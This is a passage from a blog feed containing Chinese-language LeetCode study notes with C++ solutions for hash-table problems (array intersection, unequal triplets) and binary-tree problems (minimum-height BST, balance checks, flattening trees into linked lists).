class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希表</span></span><br><span class="line"><span class="comment">    t = 左边可以选的数量 </span></span><br><span class="line"><span class="comment">    v = 当前数数量 </span></span><br><span class="line"><span class="comment">    (n−t−v) = 右边可选数数量 </span></span><br><span class="line"><span class="comment">    直接相乘</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">unequalTriplets</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; count;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> x:nums)&#123;</span><br><span class="line">            count[x]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>,n=nums.<span class="built_in">size</span>(),t=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> [_,v]:count)&#123;</span><br><span class="line">            res += t*v*(n-t-v);</span><br><span class="line">            t += v;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="349-两个数组的交集"><a href="#349-两个数组的交集" class="headerlink" title="349 两个数组的交集"></a>349 两个数组的交集</h3><p>给定两个数组 nums1 和 nums2 ，返回 它们的 <strong><em>*<strong><strong>交集</strong></strong></em>*</strong> 。输出结果中的每个元素一定是 唯一 的。我们可以 不考虑输出结果的顺序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">哈希表：两个集合，遍历小的那个</span></span><br><span class="line"><span class="comment">    时间：O(m+n)</span></span><br><span class="line"><span class="comment">    空间：O(m+n)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">intersection</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="keyword">int</span>&gt; set1,set2;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; num:nums1)&#123;</span><br><span class="line">            set1.<span class="built_in">insert</span>(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; num:nums2)&#123;</span><br><span class="line">            set2.<span class="built_in">insert</span>(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getIntersection</span>(set1,set2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">getIntersection</span><span class="params">(unordered_set&lt;<span class="keyword">int</span>&gt;&amp; set1,unordered_set&lt;<span class="keyword">int</span>&gt;&amp; set2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(set1.<span class="built_in">size</span>() &gt; set2.<span class="built_in">size</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getIntersection</span>(set2,set1);</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; intersection;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; num:set1)&#123;<span class="comment">//该处的 set 必须是元素少的那个，减少时间复杂度</span></span><br><span class="line">            <span class="keyword">if</span>(set2.<span class="built_in">count</span>(num))<span class="comment">//如果set1 和 set2 中都有某个共同元素，则加进 intersection 中</span></span><br><span class="line">                intersection.<span class="built_in">push_back</span>(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> intersection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="350-两个数组的交集-II"><a href="#350-两个数组的交集-II" class="headerlink" title="350 两个数组的交集 II"></a>350 两个数组的交集 II</h3><p>给你两个整数数组 nums1 和 nums2 ，请你以数组形式返回两数组的交集。返回结果中每个元素出现的次数，应与元素在两个数组中都出现的次数一致（如果出现次数不一致，则考虑取较小值）。可以不考虑输出结果的顺序。</p><p><strong>分析：</strong><br>由于同一个数字在两个数组中都可能出现多次，因此需要用哈希表存储每个数字出现的次数。对于一个数字，其在交集中出现的次数等于该数字在两个数组中出现次数的 <strong>最小值</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希表</span></span><br><span class="line"><span class="comment">    时间复杂度：O(m+n)</span></span><br><span class="line"><span class="comment">    时间复杂度：O(min(m+n))</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">intersect</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums1.<span class="built_in">size</span>() &gt; nums2.<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">intersect</span>(nums2,nums1);</span><br><span class="line">        &#125;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; m;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num:nums1)&#123;<span class="comment">//nums1 是两个集合中元素较少的那个</span></span><br><span class="line">            m[num]++;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; intersection;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num:nums2)&#123;</span><br><span class="line">            <span class="keyword">if</span>(m.<span class="built_in">count</span>(num))&#123;</span><br><span class="line">                <span class="comment">//如果在哈希表中存在这个数字，则将该数字添加到答案，并减少哈希表中该数字出现的次数</span></span><br><span class="line">                intersection.<span class="built_in">push_back</span>(num);</span><br><span class="line">                m[num]--;</span><br><span class="line">                <span class="keyword">if</span>(m[num]==<span class="number">0</span>)</span><br><span class="line">                    m.<span class="built_in">erase</span>(num);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> intersection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="力扣刷题" scheme="https://xizhi-future.github.io/categories/%E5%8A%9B%E6%89%A3%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="力扣" scheme="https://xizhi-future.github.io/tags/%E5%8A%9B%E6%89%A3/"/>
    
  </entry>
  
  <entry>
    <title>六、树</title>
    <link href="https://xizhi-future.github.io/2025/12/03/%E5%85%AD%E3%80%81%E6%A0%91/"/>
    <id>https://xizhi-future.github.io/2025/12/03/%E5%85%AD%E3%80%81%E6%A0%91/</id>
    <published>2025-12-03T06:13:39.000Z</published>
    <updated>2025-12-03T06:13:35.931Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="六、树——递归"><a href="#六、树——递归" class="headerlink" title="六、树——递归"></a>六、树——递归</h2><p>C++中 <strong>底层实现</strong>：</p><p>【<strong>平衡二叉搜索树</strong>】：map、set、multimap，map、set</p><ul><li>时间复杂度：O(log n)</li></ul><p>【<strong>哈希表</strong>】：unordered_map、unordered_set，unordered_map、unordered_set</p><ul><li>【<strong>深度优先遍历</strong>】：栈其实就是递归的一种实现结构，也就说前中后序遍历的逻辑其实都是可以借助<strong>栈</strong>使用非递归的方式来实现的。</li><li>【<strong>广度优先遍历</strong>】：一般使用<strong>队列</strong>来实现，这也是队列先进先出的特点所决定的，因为需要先进先出的结构，才能一层一层的来遍历二叉树。</li></ul><p><strong>二叉树 定义：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    TreeNode *left;</span><br><span class="line">    TreeNode *right;</span><br><span class="line">    <span class="built_in">TreeNode</span>(<span class="keyword">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">left</span>(<span class="literal">NULL</span>), <span class="built_in">right</span>(<span class="literal">NULL</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>递归的实现就是：每一次递归调用都会把函数的局部变量、参数值和返回地址等<strong>压入调用栈中</strong>，然后递归返回的时候，从栈顶弹出上一次递归的各项参数<br><strong>递归算法：</strong></p><ul><li>【确定递归函数的 参数 和 返回值】</li><li>【确定终止条件】：写完了递归算法, 运行的时候，经常会遇到栈溢出的错误，就是没写终止条件或者终止条件写的不对，操作系统也是用一个栈的结构来保存每一层递归的信息，如果递归没有终止，操作系统的内存栈必然就会溢出。</li><li>【确定单层递归的逻辑】： 确定每一层递归需要处理的信息。在这里也就会重复调用自己来实现递归的过程。<h3 id="面试题-04-02-最小高度树"><a href="#面试题-04-02-最小高度树" class="headerlink" title="面试题 04.02. 最小高度树"></a>面试题 04.02. 最小高度树</h3>给定一个<strong>有序整数数组</strong>，元素各不相同且按【升序排列】，编写一个算法，创建一棵高度最小的<strong>二叉搜索树</strong>。</li></ul><p><strong>【二叉搜索树】</strong> 又称二叉排序树，具有以下性质：</p><pre><code>若它的左子树不为空，则左子树上所有节点的值都小于根节点的值若它的右子树不为空，则右子树上所有节点的值都大于根节点的值它的左右子树也分别为二叉搜索树</code></pre><p>注意：<strong>二叉搜索树中序遍历的结果是有序的</strong><br>二叉搜索树的中序遍历是升序序列，题目给定的数组是按照升序排序的有序数组，因此可以确保数组是二叉搜索树的<strong>中序遍历序列</strong>。</p><p><strong>分析：</strong><br>为了使二叉搜索树的高度最小，左右子树的节点数应尽可能接近，因此我们选择中间数字作为二叉搜索树的根节点，这样分给左右子树的数字个数相同或只相差 1，可以使得二叉搜索树的高度最小。如果数组长度是奇数，则根节点的选择是唯一的，如果数组长度是偶数，则可以选择中间位置左边的数字作为根节点或者选择中间位置右边的数字作为根节点，选择不同的数字作为根节点则创建的最小高度二叉搜索树也是不同的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    中序遍历，总是选择中间位置 左边/右边 的数字作为根节点</span></span><br><span class="line"><span class="comment">    时间复杂度：O(n)，其中 n 是数组的长度。每个数字只访问一次。</span></span><br><span class="line"><span class="comment">    空间复杂度：O(log⁡n)，其中 n 是数组的长度。空间复杂度不考虑返回值，因此空间复杂度主要取决于递归栈的深度</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">sortedArrayToBST</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Create</span>(nums,<span class="number">0</span>,nums.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">Create</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums,<span class="keyword">int</span> left,<span class="keyword">int</span> right)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left&gt;right)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> mid = (left+right)/<span class="number">2</span>;<span class="comment">//选择中间位置左边的数字作为 根节点（向下取整）</span></span><br><span class="line">        <span class="comment">//int mid = (left+right+1)/2;//选择中间位置右边的数字作为 根节点</span></span><br><span class="line">        <span class="comment">//int mid = (left+right+rand()%2)/2;//选择中间位置左边或者右边的数字作为 根节点</span></span><br><span class="line">        TreeNode* root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(nums[mid]);</span><br><span class="line">        root-&gt;left = <span class="built_in">Create</span>(nums,left,mid<span class="number">-1</span>);</span><br><span class="line">        root-&gt;right = <span class="built_in">Create</span>(nums,mid+<span class="number">1</span>,right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="面试题-04-04-检查平衡性"><a href="#面试题-04-04-检查平衡性" class="headerlink" title="面试题 04.04. 检查平衡性"></a>面试题 04.04. 检查平衡性</h3><p>实现一个函数，检查二叉树是否平衡。在这个问题中，平衡树的定义如下：任意一个节点，其两棵子树的高度差不超过 1。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归——自顶向上</span></span><br><span class="line"><span class="comment">    O(n^2)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//用于计算二叉树中的任意一个节点 p 的高度</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">hight</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">hight</span>(root-&gt;left),<span class="built_in">hight</span>(root-&gt;right)) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isBalanced</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span>   </span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(<span class="built_in">hight</span>(root-&gt;left)-<span class="built_in">hight</span>(root-&gt;right)) &lt;= <span class="number">1</span></span><br><span class="line">            &amp;&amp; <span class="built_in">isBalanced</span>(root-&gt;left) &amp;&amp; <span class="built_in">isBalanced</span>(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归——自底向上</span></span><br><span class="line"><span class="comment">    O(n)遍历每个结点一次</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">height</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> leftHeight = <span class="built_in">height</span>(root-&gt;left);</span><br><span class="line">        <span class="keyword">int</span> rightHeight = <span class="built_in">height</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">if</span>(leftHeight==<span class="number">-1</span> || rightHeight==<span class="number">-1</span> || <span class="built_in">abs</span>(leftHeight-rightHeight)&gt;<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(leftHeight,rightHeight)+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isBalanced</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">height</span>(root) &gt;= <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="面试题-17-12-BiNode——二叉搜索树-gt-单向链表"><a href="#面试题-17-12-BiNode——二叉搜索树-gt-单向链表" class="headerlink" title="面试题 17.12. BiNode——二叉搜索树-&gt;单向链表"></a>面试题 17.12. BiNode——二叉搜索树-&gt;单向链表</h3><p>二叉树数据结构TreeNode可用来表示单向链表（其中left置空，right为下一个链表节点）。实现一个方法，<strong>把二叉搜索树转换为单向链表</strong>，要求依然符合二叉搜索树的性质，转换操作应是【原址的】，也就是在原始的二叉搜索树上直接修改。返回转换后的单向链表的头节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//中序遍历</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    TreeNode* ans = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">0</span>),*cur = ans;<span class="comment">//正在遍历的节点的上一个节点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(TreeNode* node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//进行中序遍历，每遍历到一个节点时，就将它的左孩子设为NULL，然后将它自身作为上一个节点的右孩子</span></span><br><span class="line">        <span class="built_in">dfs</span>(node-&gt;left);</span><br><span class="line">        node-&gt;left = <span class="literal">nullptr</span>;</span><br><span class="line">        cur-&gt;right = node;<span class="comment">//这里！</span></span><br><span class="line">        cur = node;</span><br><span class="line">        <span class="built_in">dfs</span>(node-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">convertBiNode</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">dfs</span>(root);</span><br><span class="line">        <span class="keyword">return</span> ans-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    TreeNode* p = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">0</span>);<span class="comment">//虚结点</span></span><br><span class="line">    TreeNode* p2 = p;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">convertBiNode</span><span class="params">(TreeNode* root)</span> </span>&#123;    </span><br><span class="line">        <span class="built_in">dfs</span>(root);</span><br><span class="line">        <span class="keyword">return</span> p2-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="built_in">dfs</span>(root-&gt;left);</span><br><span class="line">            <span class="built_in">visit</span>(root);</span><br><span class="line">            <span class="built_in">dfs</span>(root-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">visit</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        root-&gt;left=<span class="literal">nullptr</span>;</span><br><span class="line">        p-&gt;right = root;</span><br><span class="line">        p = root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="114-二叉树展开为链表-按照【先序遍历】"><a href="#114-二叉树展开为链表-按照【先序遍历】" class="headerlink" title="114 二叉树展开为链表-按照【先序遍历】"></a>114 二叉树展开为链表-按照【先序遍历】</h3><p>给你二叉树的根结点 root ，请你将它展开为一个单链表：<br>展开后的单链表应该与二叉树【先序遍历】顺序相同。<br><img src="https://img-blog.csdnimg.cn/c275711df0f84173a8715d7ffb39e245.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    自己写的 正确</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(TreeNode *root, vector&lt;<span class="keyword">int</span>&gt;&amp; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        res.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="built_in">preorder</span>(root-&gt;left,res);</span><br><span class="line">        <span class="built_in">preorder</span>(root-&gt;right,res);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">flatten</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="built_in">preorder</span>(root,res);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;res.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> value = res[i];</span><br><span class="line">            root-&gt;val = value;</span><br><span class="line">            root-&gt;left = <span class="literal">nullptr</span>;</span><br><span class="line">            <span class="keyword">if</span>(root-&gt;right)&#123;</span><br><span class="line">                root = root-&gt;right;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(i==res.<span class="built_in">size</span>()<span class="number">-1</span>)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                TreeNode *node = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">0</span>);</span><br><span class="line">                root-&gt;right = node;</span><br><span class="line">                root = node;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*法二：</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">flatten</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;TreeNode*&gt; l;</span><br><span class="line">        <span class="built_in">preorderTraversal</span>(root, l);</span><br><span class="line">        <span class="keyword">int</span> n = l.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            TreeNode *prev = l.<span class="built_in">at</span>(i - <span class="number">1</span>), *curr = l.<span class="built_in">at</span>(i);</span><br><span class="line">            prev-&gt;left = <span class="literal">nullptr</span>;</span><br><span class="line">            prev-&gt;right = curr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span 